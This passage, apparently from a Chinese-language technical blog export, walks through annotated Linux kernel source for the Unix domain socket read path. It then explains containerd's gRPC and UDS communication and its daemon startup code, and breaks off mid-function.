count) { struct fd f = fdget_pos(fd); ssize_t ret = -EBADF; if (f.file) { loff_t pos, *ppos = file_ppos(f.file); if (ppos) { pos = *ppos; ppos = \u0026amp;pos; } // 调用 vfs_read() 函数执行实际的文件读取操作 ret = vfs_read(f.file, buf, count, ppos); if (ret \u0026gt;= 0 \u0026amp;\u0026amp; ppos) f.file-\u0026gt;f_pos = pos; fdput_pos(f); } return ret; } ksys_read()-\u0026gt;vfs_read()\nvfs_read 函数负责从文件对象读取数据并将其拷贝到用户空间的缓冲区中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos) { ssize_t ret; // 检查文件是否可读 if (!(file-\u0026gt;f_mode \u0026amp; FMODE_READ)) return -EBADF; // 检查文件是否允许读取操作 if (!(file-\u0026gt;f_mode \u0026amp; FMODE_CAN_READ)) return -EINVAL; // 检查用户空间缓冲区的有效性 if (unlikely(!access_ok(buf, count))) return -EFAULT; // 调用 rw_verify_area() 验证读取的区域是否合法，主要用于检查文件的偏移量和读取的字节数是否超出了文件边界。 ret = rw_verify_area(READ, file, pos, count); if (ret) return ret; // 限制读取字节数 if (count \u0026gt; MAX_RW_COUNT) count = MAX_RW_COUNT; // 执行读取操作,这里会调用sock_read_iter if (file-\u0026gt;f_op-\u0026gt;read) //旧 ret = file-\u0026gt;f_op-\u0026gt;read(file, buf, count, pos); else if (file-\u0026gt;f_op-\u0026gt;read_iter) //新 ret = new_sync_read(file, buf, count, pos); else ret = -EINVAL; if (ret \u0026gt; 0) { // 更新读取的统计信息 fsnotify_access(file); add_rchar(current, ret); } inc_syscr(current); return ret; } vfs_read()-\u0026gt;sock_read_iter()\nsock_read_iter() 是 Linux 内核中用于处理套接字读取操作的函数。它用于从套接字中读取数据，并将数据写入用户空间的缓冲区中。这个函数利用 kiocb 和 iov_iter 结构来支持异步和向量化的 I/O 操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 static ssize_t sock_read_iter(struct kiocb *iocb, struct iov_iter *to) { struct file *file = iocb-\u0026gt;ki_filp; struct socket *sock = file-\u0026gt;private_data; struct msghdr msg = {.msg_iter = *to, .msg_iocb = iocb}; ssize_t res; // 如果文件标志包含 O_NONBLOCK 或 iocb 中的标志包含 IOCB_NOWAIT，则设置非阻塞标志 if (file-\u0026gt;f_flags \u0026amp; O_NONBLOCK || (iocb-\u0026gt;ki_flags \u0026amp; IOCB_NOWAIT)) msg.msg_flags = MSG_DONTWAIT; // 确保偏移量为 0，因为 socket 不能进行偏移读写 if (iocb-\u0026gt;ki_pos != 0) return -ESPIPE; // 如果迭代器没有数据需要写入，直接返回 0 if (!iov_iter_count(to)) /* Match SYS5 behaviour */ return 0; // 调用 sock_recvmsg 来接收消息 res = sock_recvmsg(sock, \u0026amp;msg, msg.msg_flags); // 更新迭代器的状态 *to = msg.msg_iter; return res; } sock_read_iter()-\u0026gt;sock_recvmsg()\n1 2 3 4 5 6 int sock_recvmsg(struct socket *sock, struct msghdr *msg, int flags) { int err = security_socket_recvmsg(sock, msg, msg_data_left(msg), flags); return err ?: sock_recvmsg_nosec(sock, msg, flags); } sock_recvmsg()-\u0026gt;sock_recvmsg_nosec()\n1 2 3 4 5 6 7 8 9 10 11 static inline int sock_recvmsg_nosec(struct socket *sock, struct msghdr *msg, int flags) { int ret = INDIRECT_CALL_INET(READ_ONCE(sock-\u0026gt;ops)-\u0026gt;recvmsg, inet6_recvmsg, inet_recvmsg, sock, msg, msg_data_left(msg), flags); if (trace_sock_recv_length_enabled()) call_trace_sock_recv_length(sock-\u0026gt;sk, ret, flags); return ret; } sock_recvmsg_nosec()-\u0026gt;unix_stream_recvmsg()\nunix_stream_recvmsg() 是 Linux 内核中处理 UNIX 域套接字流类型的消息接收函数。它主要用于从流式 UNIX 域套接字中接收数据并填充到 msghdr 结构中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 static int unix_stream_recvmsg(struct socket *sock, struct msghdr *msg, size_t size, int flags) { struct unix_stream_read_state state = { .recv_actor = unix_stream_read_actor, .socket = sock, .msg = msg, .size = size, .flags = flags }; #ifdef CONFIG_BPF_SYSCALL struct sock *sk = sock-\u0026gt;sk; const struct proto *prot = READ_ONCE(sk-\u0026gt;sk_prot); // 如果套接字协议不是 UNIX 域协议，则调用其他协议的 recvmsg 方法 if (prot != \u0026amp;unix_stream_proto) return prot-\u0026gt;recvmsg(sk, msg, size, flags, NULL); #endif // 调用通用的 UNIX 流读取函数 return unix_stream_read_generic(\u0026amp;state, true); } unix_stream_recvmsg()-\u0026gt;unix_stream_read_generic()\nunix_stream_read_generic() 是一个用于从 UNIX 域套接字流中读取数据的函数。它管理从内核中的套接字缓冲区 (sk_buff) 中读取数据的整个过程，并处理多个复杂场景，包括非阻塞读取、接收外带数据（OOB）、等待数据可用等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 static int unix_stream_read_generic(struct unix_stream_read_state *state, bool freezable) { struct scm_cookie scm; struct socket *sock = state-\u0026gt;socket; struct sock *sk = sock-\u0026gt;sk; struct unix_sock *u = unix_sk(sk); int copied = 0; int flags = state-\u0026gt;flags; int noblock = flags \u0026amp; MSG_DONTWAIT; bool check_creds = false; int target; int err = 0; long timeo; int skip; size_t size = state-\u0026gt;size; unsigned int last_len; if (unlikely(sk-\u0026gt;sk_state != TCP_ESTABLISHED)) { err = -EINVAL; goto out; } if (unlikely(flags \u0026amp; MSG_OOB)) { err = -EOPNOTSUPP; #if IS_ENABLED(CONFIG_AF_UNIX_OOB) err = unix_stream_recv_urg(state); #endif goto out; } // 获取 socket 读取的低水位标记 target = sock_rcvlowat(sk, flags \u0026amp; MSG_WAITALL, size); timeo = sock_rcvtimeo(sk, noblock); memset(\u0026amp;scm, 0, sizeof(scm)); // 加锁以防止在读取过程中发生队列混乱 mutex_lock(\u0026amp;u-\u0026gt;iolock); skip = max(sk_peek_offset(sk, flags), 0); do { int chunk; bool drop_skb; struct sk_buff *skb, *last; redo: // 锁定套接字的状态以进行安全的数据读取 unix_state_lock(sk); if (sock_flag(sk, SOCK_DEAD)) { err = -ECONNRESET; goto unlock; } last = skb = skb_peek(\u0026amp;sk-\u0026gt;sk_receive_queue); last_len = last ? last-\u0026gt;len : 0; #if IS_ENABLED(CONFIG_AF_UNIX_OOB) if (skb) { skb = manage_oob(skb, sk, flags, copied); if (!skb) { unix_state_unlock(sk); if (copied) break; goto redo; } } #endif again: if (skb == NULL) { if (copied \u0026gt;= target) goto unlock; // 检查 socket 错误 err = sock_error(sk); if (err) goto unlock; // 检查接收端关闭 if (sk-\u0026gt;sk_shutdown \u0026amp; RCV_SHUTDOWN) goto unlock; unix_state_unlock(sk); if (!timeo) { err = -EAGAIN; break; } mutex_unlock(\u0026amp;u-\u0026gt;iolock); // 等待数据到来 timeo = unix_stream_data_wait(sk, timeo, last, last_len, freezable); if (signal_pending(current)) { err = sock_intr_errno(timeo); scm_destroy(\u0026amp;scm); goto out; } mutex_lock(\u0026amp;u-\u0026gt;iolock); goto redo; unlock: unix_state_unlock(sk); break; } // 循环处理 sk_buff 数据，找到要开始读取的 skb，并跳过已被读取的数据。skip 是需要跳过的数据字节数，它通过与每个 skb 的长度比较，决定是否需要跳过当前的 skb，直到找到需要读取的 skb。 while (skip \u0026gt;= unix_skb_len(skb)) { skip -= unix_skb_len(skb); last = skb; last_len = skb-\u0026gt;len; skb = skb_peek_next(skb, \u0026amp;sk-\u0026gt;sk_receive_queue); if (!skb) goto again; } unix_state_unlock(sk); // 检查并设置消息发送者的凭据 if (check_creds) { if (!unix_skb_scm_eq(skb, \u0026amp;scm)) break; } else if (test_bit(SOCK_PASSCRED, \u0026amp;sock-\u0026gt;flags) || test_bit(SOCK_PASSPIDFD, \u0026amp;sock-\u0026gt;flags)) { scm_set_cred(\u0026amp;scm, UNIXCB(skb).pid, UNIXCB(skb).uid, UNIXCB(skb).gid); unix_set_secdata(\u0026amp;scm, skb); check_creds = true; } // 将地址信息复制到消息中 if (state-\u0026gt;msg \u0026amp;\u0026amp; state-\u0026gt;msg-\u0026gt;msg_name) { DECLARE_SOCKADDR(struct sockaddr_un *, sunaddr, state-\u0026gt;msg-\u0026gt;msg_name); unix_copy_addr(state-\u0026gt;msg, skb-\u0026gt;sk); sunaddr = NULL; } // 确定本次要读取的数据量 chunk = min_t(unsigned int, unix_skb_len(skb) - skip, size); skb_get(skb); // recv_actor 是一个函数指针，用于将数据从 sk_buff 复制到用户空间的缓冲区中。 // recv_actor 会读取从偏移量 skip 开始的 chunk 字节的数据到指定的缓冲区，通常由 unix_stream_read_actor 指向的函数来完成。 chunk = state-\u0026gt;recv_actor(skb, skip, chunk, state); drop_skb = !unix_skb_len(skb); consume_skb(skb); if (chunk \u0026lt; 0) { if (copied == 0) copied = -EFAULT; break; } copied += chunk; size -= chunk; if (drop_skb) { err = 0; break; } // 标记被读取的部分，将已读取的数据从缓冲区中标记为已消费，并调整偏移量，如果读取完毕则将 skb 从队列中移除并释放。 if (!(flags \u0026amp; MSG_PEEK)) { UNIXCB(skb).consumed += chunk; sk_peek_offset_bwd(sk, chunk); if (UNIXCB(skb).fp) { scm_stat_del(sk, skb); unix_detach_fds(\u0026amp;scm, skb); } if (unix_skb_len(skb)) break; skb_unlink(skb, \u0026amp;sk-\u0026gt;sk_receive_queue); consume_skb(skb); if (scm.fp) break; } else { if (UNIXCB(skb).fp) unix_peek_fds(\u0026amp;scm, skb); sk_peek_offset_fwd(sk, chunk); if (UNIXCB(skb).fp) break; skip = 0; last = skb; last_len = skb-\u0026gt;len; unix_state_lock(sk); skb = skb_peek_next(skb, \u0026amp;sk-\u0026gt;sk_receive_queue); if (skb) goto again; unix_state_unlock(sk); break; } } while (size); mutex_unlock(\u0026amp;u-\u0026gt;iolock); if (state-\u0026gt;msg) scm_recv_unix(sock, state-\u0026gt;msg, \u0026amp;scm, flags); else scm_destroy(\u0026amp;scm); out: return copied ? : err; } 几个套接字结构之间的区别如下表所示\n名称 类型 位置 主要功能 socket 用户空间结构 用户空间 由应用程序创建和操作的网络套接字接口，提供对外通信功能。 sock 内核空间结构 内核空间 内核中的套接字表示，封装具体协议栈的实现，负责管理网络连接和数据传输。 unix_sock 内核空间结构（sock的子类） 内核空间 专用于 Unix 域套接字，存储特定于 Unix 域套接字的数据（如路径、地址等）。 ","date":"2024-12-15T00:00:00Z","image":"https://image.chenyuan1125.top/uds.jpg","permalink":"https://chenyuan1125.github.io/p/unix-domain-socket%E6%BA%90%E7%A0%81%E5%AE%9E%E7%8E%B0%E5%88%86%E6%9E%90olk-6.6/","title":"Unix Domain Socket源码实现分析(OLK 6.6)"},{"content":"containerd通信机制 简述 Containerd 是一个云原生（容器）领域行业标准容器运行时。以操作系统守护进程方式提供服务，管理一台机器上每个容器生命周期，包括：\n镜像下载和存储。 容器 rootfs （根文件系统）的生成。 容器的启动和守护。 容器的低级存储和附加网络。 Containerd 是 CNCF 毕业项目，是 Kubernetes 和 Docker 的默认容器运行时。\nContainerd 守护进程默认提供了两套 API：\nContainerd 原生 GRPC API （源码），并提供了 Go SDK （参见：源码），Docker 以该方式集成 Containerd。 Kubernetes 的 CRI GRPC API（源码），形态上通过 Containerd Plugin 的方式提供服务（原生插件，打包到了 Containerd 二进制中），架构参见：docs。Kubernetes 以该方式集成 Containerd。 在底层容器运行时方面，Containerd 采用 OCI-runtime 标准，默认使用 runc 作为运行时。\n简单概述典型场景中 Kubernetes、Containerd、Runc 的 层级关系如下：\nKubernetes 负责集群（多节点）的调度和管理，在单个节点，通过 Kubelet 组件通过 CRI GRPC 接口调用 Containerd。 Containerd 提供单个节点的容器生命周期管理，包括镜像、存储、rootfs、网络，启动容器是 Containerd 通过 OCI-runtime 标准调用 runc。 Runc 容器引导器，负责根据一个容器的具体配置，在指定 rootfs 上引导启动一个容器进程。 gRPC框架原理 gRPC（Google Remote Procedure Call）是一个现代化、高性能的远程过程调用（RPC）框架，设计用于在分布式系统中实现跨网络、跨语言的服务调用。它利用了 HTTP/2 和 Protocol Buffers，为开发者提供了一种简便的方式来调用远程服务，就像调用本地函数一样。下面是 gRPC 的基本原理及其关键组件。\ngRPC 的工作流程 服务定义与接口生成 Protocol Buffers 定义服务: containerd 使用 Protocol Buffers（protobuf）来定义 gRPC 服务。这些服务接口和消息结构通常定义在 .proto 文件中。例如，containers.proto 文件定义了容器管理的服务接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 protobufCopy codesyntax = \u0026#34;proto3\u0026#34;; service Containers { rpc Create (CreateContainerRequest) returns (CreateContainerResponse); rpc Start (StartContainerRequest) returns (StartContainerResponse); rpc Stop (StopContainerRequest) returns (StopContainerResponse); } message CreateContainerRequest { string id = 1; // 其他字段... } message CreateContainerResponse { // 响应字段... } 生成客户端和服务端代码: 使用 protoc 编译器，.proto 文件会生成相应的客户端和服务端代码。对于 containerd，这些生成的代码是与 containerd 核心功能集成在一起的，客户端代码通常由外部工具或服务使用。\ngRPC 服务的实现 服务实现: containerd 中每个 gRPC 服务都有一个具体的实现，这些实现负责处理来自客户端的请求并执行相应的操作。服务的实现通常位于 containerd 的 services 目录中，下面是一个示例。\n1 2 3 4 5 6 7 8 9 10 11 12 13 type containersServer struct { // 相关字段和依赖注入 } func (s *containersServer) Create(ctx context.Context, req *CreateContainerRequest) (*CreateContainerResponse, error) { // 实现容器创建逻辑 } func (s *containersServer) Start(ctx context.Context, req *StartContainerRequest) (*StartContainerResponse, error) { // 实现容器启动逻辑 } // 其他服务方法... 服务注册: 在 containerd 启动时，gRPC 服务器会启动并监听一个 Unix Domain Socket (UDS) 地址或 TCP 端口，然后将所有的服务注册到 gRPC 服务器中。\n1 2 3 grpcServer := grpc.NewServer() containerspb.RegisterContainersServer(grpcServer, \u0026amp;containersService) // 注册其他服务... gRPC 通信机制 请求的发送与接收: 客户端通过生成的 gRPC 客户端代码向 containerd 发送请求。请求通过 gRPC 框架在客户端进行序列化（使用 Protocol Buffers），然后通过底层传输协议（通常是 HTTP/2 over Unix Domain Sockets）发送到 containerd。 服务器端处理: containerd 的 gRPC 服务器接收到请求后，将其反序列化为相应的消息对象，并调用对应服务的实现方法进行处理。处理完成后，响应结果再通过 gRPC 返回给客户端。 连接管理: gRPC 支持长连接，多个请求可以在同一个连接中并发进行。对于本地通信，containerd 通常使用 Unix Domain Sockets (UDS) 作为传输层，提升通信效率并增强安全性。 关键应用场景 客户端与 containerd 的通信: 外部客户端（如 ctr 工具或 Docker 引擎）通过 gRPC 与 containerd 进行通信，执行容器的创建、启动、停止、删除等操作。 containerd 插件的集成: 插件通过 gRPC 提供服务接口，containerd 核心通过调用这些接口来管理镜像、快照和容器运行时等。 containerd-shim 与 containerd 的通信: containerd-shim 进程负责管理每个容器的生命周期，与 containerd 核心通过 gRPC 通信来报告容器状态、接收管理命令等。 gRPC中使用UDS的场景 在 containerd 中，Unix Domain Sockets (UDS) 通信通常用于以下场景：\ncontainerd 守护进程与客户端之间的通信 场景: containerd 守护进程与外部客户端（如 ctr 工具或 Docker 引擎）之间的通信。 例子: 当 Docker 引擎需要与 containerd 交互时，它通过 gRPC 连接到 containerd 的 UDS 地址，如 /run/containerd/containerd.sock，以请求管理容器、镜像、快照等操作。 详细描述: containerd 启动时，会在配置的地址（通常是 /run/containerd/containerd.sock）上创建一个 UDS 监听器。 Docker 引擎或其他客户端通过 gRPC 连接到这个 UDS 地址来与 containerd 交互。 这种方式避免了网络开销，并限制了通信只能发生在本地主机上，提高了安全性。 containerd-shim 与 containerd 守护进程之间的通信 场景: 每个容器都有一个 containerd-shim 进程，containerd-shim 负责管理容器的生命周期，而 containerd-shim 与 containerd 守护进程之间的通信也是通过 UDS 实现的。 例子: 当 containerd 启动一个新的容器时，它会创建并启动一个对应的 containerd-shim 进程。containerd-shim 通过一个 UDS 与 containerd 进行通信，以报告容器的状态和接受命令。 详细描述: containerd-shim 进程会为每个容器创建一个 UDS，用于与 containerd 交互。 通过这个 UDS，containerd 可以向 containerd-shim 发送指令，如启动或停止容器，并接收来自 containerd-shim 的状态更新。 containerd 插件与外部服务的通信 场景: 某些插件可能作为外部服务运行，需要通过 UDS 与 containerd 通信。 例子: 一些外部存储插件可能独立运行并通过 UDS 暴露其 gRPC 服务，containerd 通过连接这个 UDS 来调用插件的服务。 详细描述: 插件可以在不同的进程中运行，通过 UDS 暴露其服务接口。 containerd 连接到这些 UDS 地址来与插件交互，执行诸如存储管理或网络管理等操作。 守护进程之间的通信 场景: 如果需要在多个守护进程（例如 containerd 和其他依赖服务）之间建立安全且高效的本地通信，可以使用 UDS。 例子: 在一些复杂的集群环境中，containerd 可能需要与其他守护进程（如 CRI-O、etcd 等）进行本地通信，这种情况下也可能使用 UDS。 详细描述: 多个守护进程在同一台主机上运行时，通过 UDS 通信，避免了使用 TCP/IP 带来的网络开销和安全风险。 containerd源码分析 containerd启动流程 文件路径：containerd/cmd/containerd/main.go，整个程序从这里开始启动，调用command.App()函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package main import ( \u0026#34;crypto\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;github.com/containerd/containerd/v2/cmd/containerd/command\u0026#34; \u0026#34;github.com/containerd/containerd/v2/internal/hasher\u0026#34; _ \u0026#34;github.com/containerd/containerd/v2/cmd/containerd/builtins\u0026#34; ) func init() { crypto.RegisterHash(crypto.SHA256, hasher.NewSHA256) } func main() { app := command.App() if err := app.Run(os.Args); err != nil { fmt.Fprintf(os.Stderr, \u0026#34;containerd: %s\\n\u0026#34;, err) os.Exit(1) } } 文件路径：containerd/cmd/containerd/command/main.go，该文件主要用于实现 containerd 守护进程的启动和管理逻辑。该代码包括了如何初始化 containerd 守护进程、解析命令行参数、设置配置项，以及处理信号和服务终止。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 // App returns a *cli.App instance. func App() *cli.App { app := cli.NewApp() app.Name = \u0026#34;containerd\u0026#34; app.Version = version.Version app.Usage = usage app.Flags = append(app.Flags, serviceFlags()...) app.Commands = []*cli.Command{ configCommand, publishCommand, ociHook, } app.Action = func(cliContext *cli.Context) error { var ( start = time.Now() signals = make(chan os.Signal, 2048) serverC = make(chan *server.Server, 1) ctx, cancel = context.WithCancel(cliContext.Context) config = defaultConfig() ) //···此处省略部分代码 if config.Debug.Address != \u0026#34;\u0026#34; { var l net.Listener if isLocalAddress(config.Debug.Address) { if l, err = sys.GetLocalListener(config.Debug.Address, config.Debug.UID, config.Debug.GID); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } else { if l, err = net.Listen(\u0026#34;tcp\u0026#34;, config.Debug.Address); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } serve(ctx, l, server.ServeDebug) } if config.Metrics.Address != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.Metrics.Address) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for metrics endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeMetrics) } // setup the ttrpc endpoint tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) if config.GRPC.TCPAddress != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.GRPC.TCPAddress) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for TCP grpc endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeTCP) } // setup the main grpc endpoint l, err := sys.GetLocalListener(config.GRPC.Address, config.GRPC.UID, config.GRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeGRPC) readyC := make(chan struct{}) go func() { server.Wait() close(readyC) }() return nil } return app } func serve(ctx context.Context, l net.Listener, serveFunc func(net.Listener) error) { path := l.Addr().String() log.G(ctx).WithField(\u0026#34;address\u0026#34;, path).Info(\u0026#34;serving...\u0026#34;) go func() { defer l.Close() if err := serveFunc(l); err != nil { log.G(ctx).WithError(err).WithField(\u0026#34;address\u0026#34;, path).Fatal(\u0026#34;serve failure\u0026#34;) } }() } //···此处省略部分代码 详细分析（我只挑些重点的分析）：\n主逻辑 (app.Action)\napp.Action 中的主逻辑是 containerd 守护进程启动的核心部分。它包括初始化上下文、加载和应用配置、启动 gRPC 和 TTRPC 服务、信号处理，以及最终的服务启动和管理。以下是对主逻辑的详细分析：\n初始化\n1 2 3 4 5 6 7 8 var ( start = time.Now() signals = make(chan os.Signal, 2048) serverC = make(chan *server.Server, 1) ctx, cancel = context.WithCancel(cliContext.Context) config = defaultConfig() ) defer cancel() 时间记录 (start): 记录守护进程启动的时间，用于后续日志记录启动耗时。\n信号通道 (signals): 创建一个缓冲区为 2048 的通道，用于接收系统信号，如 SIGTERM 或 SIGHUP，以便进行优雅的关闭操作。\n服务器通道 (serverC): 用于在异步初始化完成后传递 containerd 服务器实例。\n上下文 (ctx, cancel): 使用 context.WithCancel 创建一个可取消的上下文，确保在需要时能够取消所有与上下文关联的操作。\n配置 (config): 调用 defaultConfig() 函数创建一个默认配置对象，用于存储加载的配置选项。\n加载和应用配置\n1 2 3 4 5 6 7 configPath := cliContext.String(\u0026#34;config\u0026#34;) _, err := os.Stat(configPath) if !os.IsNotExist(err) || cliContext.IsSet(\u0026#34;config\u0026#34;) { if err := srvconfig.LoadConfig(ctx, configPath, config); err != nil { return err } } 配置文件路径: 从命令行参数中获取配置文件路径（configPath），默认情况下指向 /etc/containerd/config.toml 或其他默认路径。\n检查配置文件存在性: 使用 os.Stat 检查配置文件是否存在，或者用户是否明确指定了配置文件路径。如果存在或指定了路径，调用 srvconfig.LoadConfig 加载配置文件到 config 对象中。\n错误处理: 如果加载配置失败，立即返回错误并终止启动流程。\n确保必要配置存在\n1 2 3 4 5 6 7 8 if config.GRPC.Address == \u0026#34;\u0026#34; { return fmt.Errorf(\u0026#34;grpc address cannot be empty: %w\u0026#34;, errdefs.ErrInvalidArgument) } if config.TTRPC.Address == \u0026#34;\u0026#34; { config.TTRPC.Address = config.GRPC.Address + \u0026#34;.ttrpc\u0026#34; config.TTRPC.UID = config.GRPC.UID config.TTRPC.GID = config.GRPC.GID } 验证 gRPC 地址: 确保 gRPC 服务的地址已在配置中设置。如果没有设置，则返回错误，因为 gRPC 地址是 containerd 服务的关键配置。 设置 TTRPC 地址: 如果 TTRPC 地址未配置，则使用 gRPC 地址附加 .ttrpc 作为默认地址，并复制 gRPC 的用户 ID 和组 ID 设置。 处理服务注册和信号\n1 2 3 4 5 6 7 8 9 10 stop, err := registerUnregisterService(config.Root) if err != nil { log.L.Fatal(err) } if stop { return nil } done := handleSignals(ctx, signals, serverC, cancel) signal.Notify(signals, handledSignals...) 服务注册/注销: 调用 registerUnregisterService 函数，处理 Windows 服务的注册或注销。如果处理完毕则终止程序（用于在 Windows 上操作服务控制管理器）。 信号处理: 调用 handleSignals 函数，设置信号处理器 done，用于处理来自系统的信号（如 SIGTERM、SIGINT）。然后调用 signal.Notify，将指定的信号注册到 signals 通道中，以便在接收到信号时触发相应的操作。 启动 containerd 服务器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 type srvResp struct { s *server.Server err error } chsrv := make(chan srvResp) go func() { defer close(chsrv) server, err := server.New(ctx, config) if err != nil { select { case chsrv \u0026lt;- srvResp{err: err}: case \u0026lt;-ctx.Done(): } return } if err := launchService(server, done); err != nil { log.L.Fatal(err) } select { case \u0026lt;-ctx.Done(): server.Stop() case chsrv \u0026lt;- srvResp{s: server}: } }() 异步初始化服务器: 使用 goroutine 异步初始化 containerd 服务器，避免在主线程中阻塞，例如在 Bolt 数据库初始化过程中。 创建 containerd 服务器: 调用 server.New 使用配置初始化 containerd 服务器实例。如果出现错误，通过 chsrv 通道返回错误并退出。 启动服务: 如果需要，调用 launchService 启动 containerd 服务器作为 Windows 服务（仅在 Windows 平台上）。 停止服务器: 监听 ctx.Done() 信号，当上下文被取消时，调用 server.Stop 停止服务器。 进一步分析server.New()函数，这个函数在containerd/cmd/containerd/server/server.go中。\n这个函数用于创建和初始化 gRPC 服务器的核心部分。它涉及配置的迁移、插件的加载与初始化、gRPC 服务的注册，以及其他服务器设置。（我这里只分析了部分重要源码）\n(1)配置迁移\n1 2 3 4 5 6 7 8 9 if currentVersion \u0026lt; version.ConfigVersion { // Migrate config to latest version t1 := time.Now() err := config.MigrateConfig(ctx) if err != nil { return nil, err } migrationT = time.Since(t1) } 版本检查与迁移：如果当前配置的版本低于系统要求的版本，则进行配置迁移。迁移时间被记录在 migrationT 中。\n配置迁移：通过 config.MigrateConfig(ctx) 方法进行迁移，将配置更新到最新版本。\n(2)配置 Stream 处理器\n1 2 3 for id, p := range config.StreamProcessors { diff.RegisterProcessor(diff.BinaryHandler(id, p.Returns, p.Accepts, p.Path, p.Args, p.Env)) } 注册流处理器：根据配置中的 StreamProcessors 注册流处理器，这些处理器用于处理数据流。 (3)、初始化 gRPC 服务器\n1 2 3 4 5 6 7 8 9 10 11 serverOpts := []grpc.ServerOption{ grpc.StatsHandler(otelgrpc.NewServerHandler()), grpc.ChainStreamInterceptor( streamNamespaceInterceptor, prometheusServerMetrics.StreamServerInterceptor(), ), grpc.ChainUnaryInterceptor( unaryNamespaceInterceptor, prometheusServerMetrics.UnaryServerInterceptor(), ), } gRPC 服务器选项：配置 gRPC 服务器的选项，如统计处理程序、拦截器等。这些拦截器可以用于处理命名空间、监控等。 (4)、注册服务\n1 2 3 4 5 for _, service := range grpcServices { if err := service.Register(grpcServer); err != nil { return nil, err } } 启动 gRPC 和其他服务（重点）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 if config.Debug.Address != \u0026#34;\u0026#34; { var l net.Listener if isLocalAddress(config.Debug.Address) { if l, err = sys.GetLocalListener(config.Debug.Address, config.Debug.UID, config.Debug.GID); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } else { if l, err = net.Listen(\u0026#34;tcp\u0026#34;, config.Debug.Address); err != nil { return fmt.Errorf(\u0026#34;failed to get listener for debug endpoint: %w\u0026#34;, err) } } serve(ctx, l, server.ServeDebug) } if config.Metrics.Address != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.Metrics.Address) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for metrics endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeMetrics) } tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) if config.GRPC.TCPAddress != \u0026#34;\u0026#34; { l, err := net.Listen(\u0026#34;tcp\u0026#34;, config.GRPC.TCPAddress) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for TCP grpc endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeTCP) } l, err := sys.GetLocalListener(config.GRPC.Address, config.GRPC.UID, config.GRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main endpoint: %w\u0026#34;, err) } serve(ctx, l, server.ServeGRPC) 启动调试服务: 如果配置了调试地址，调用 serve 启动调试服务 (ServeDebug)。 启动度量服务: 如果配置了度量地址，调用 serve 启动度量服务 (ServeMetrics)。 启动 TTRPC 服务: 使用 sys.GetLocalListener 获取本地监听器并启动 TTRPC 服务 (ServeTTRPC)。 启动 gRPC 服务: 如果配置了 TCP gRPC 地址，则通过 TCP 启动 gRPC 服务 (ServeTCP)。同时，还会为主要的 gRPC 服务配置 Unix Domain Socket (UDS) 并启动服务 (ServeGRPC)。 服务启动与处理\nserve 函数用于启动指定的服务，接受一个监听器 l 和一个服务函数 serveFunc 作为参数。它在新的 goroutine 中执行服务函数，并在服务结束后关闭监听器。\n1 2 3 4 5 6 7 8 9 10 func serve(ctx context.Context, l net.Listener, serveFunc func(net.Listener) error) { path := l.Addr().String() log.G(ctx).WithField(\u0026#34;address\u0026#34;, path).Info(\u0026#34;serving...\u0026#34;) go func() { defer l.Close() if err := 